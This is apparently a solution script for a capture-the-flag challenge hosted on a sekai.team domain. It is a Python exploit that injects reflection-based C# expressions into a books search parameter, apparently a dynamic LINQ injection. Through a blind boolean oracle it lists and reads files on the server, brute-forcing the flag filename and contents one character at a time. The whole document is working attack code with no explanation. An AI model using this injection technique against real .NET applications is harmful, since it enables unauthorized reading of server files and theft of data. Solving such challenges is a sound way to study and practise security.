import requests
from urllib.parse import quote_plus

URL = 'https://intruder-kfdqqilsb0mk.chals.sekai.team'

ch = 'flag_-01234567890abcdef.txt'
filename = ""
while not filename.endswith('.txt'):
    for c in ch:
        r = requests.get(URL + '/books?searchString=' + quote_plus('Harry") AND "".GetType().Assembly.DefinedTypes.First(x => x.FullName == "System"+"."+"String").DeclaredMethods.Where(x => x.Name == "StartsWith").First().Invoke("".GetType().Assembly.DefinedTypes.First(x => x.FullName == "System.Array").DeclaredMethods.Where(x => x.Name == "GetValue").Skip(1).First().Invoke("".GetType().Assembly.DefinedTypes.First(x => x.FullName == "System.IO.Directory").DeclaredMethods.Where(x => x.Name == "GetFiles").Skip(1).First().Invoke(null, new object[] { "/", "flag*.txt" }), new object[] { 0 }), new object[] { "/'+(filename+c)+'" }).ToString()=="True" AND ("xx"="xx'))
        if r.status_code == 200 and 'No books found.' not in r.text:
            filename += c
            print(filename)

ch = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}'
flag = ""
while not flag.endswith('}'):
    for c in ch:
        r = requests.get(URL + '/books?searchString=' + quote_plus('Harry") AND "".GetType().Assembly.DefinedTypes.First(x => x.FullName == "System"+"."+"String").DeclaredMethods.Where(x => x.Name == "StartsWith").First().Invoke("".GetType().Assembly.DefinedTypes.First(x => x.FullName == "System"+".IO."+"File").DeclaredMethods.Where(x => x.Name == "ReadAllText").First().Invoke(null, new object[] { "/'+filename+'" }), new object[] { "' + (flag+c) + '" }).ToString()=="True" AND ("xx"="xx'))
        if r.status_code == 200 and 'No books found.' not in r.text:
            flag += c
            print(flag)